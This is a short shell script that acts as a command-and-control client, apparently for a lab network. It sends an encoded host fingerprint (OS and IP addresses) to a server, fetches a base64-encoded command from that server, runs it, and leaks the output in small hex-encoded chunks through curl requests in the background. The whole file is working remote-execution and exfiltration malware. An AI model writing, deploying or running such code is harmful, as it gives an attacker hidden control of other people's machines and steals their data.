#!/bin/sh
OS=`uname`
OSv1=`printf '%s' " $OS " | base64 | xxd -p | rev`
Hostid=`hostname -I | base64 | xxd -p | rev`
HOSid=`echo $Hostid$OSv1`
sleep 1
# sending signal as client to detect by server 
curl "http://192.168.56.1/default.aspx?Session=$HOSid"
sleep 1

read -p "press enter to continue..." input
# dumping information about cmd from server 
nohup curl "http://192.168.56.1/getcmd.aspx" > "dumpcmds.log" 2>&1 &
sleep 2.5
# detecting cmd 
mycmd=`strings "dumpcmds.log" | grep "myTimeLabel_CMD" | cut -d'>' -f2 | cut -d'<' -f1 | base64 -d`
sleep 1
	#executing cmd
	output=`$mycmd`

	sleep 1
	LocalhostIPv4=`hostname -I`
	output=`echo "[$LocalhostIPv4] => "$output`
	# data/cmd-output sending via chunked (uids=bytes).values start
	for bytes in `echo $output | xxd -p -c 12 | rev`;
	do
	sleep 1.5
	nohup curl "http://192.168.56.1/default.aspx?uids=$bytes" > out.txt  2>&1 &
	done
	# data/cmd-output sending via chunked (uids=bytes).values done
sleep 1.5
# sending signal to server for "cmd-output Exfiltration finish"
nohup curl "http://192.168.56.1/default.aspx?logoff=null" > out.txt  2>&1 &
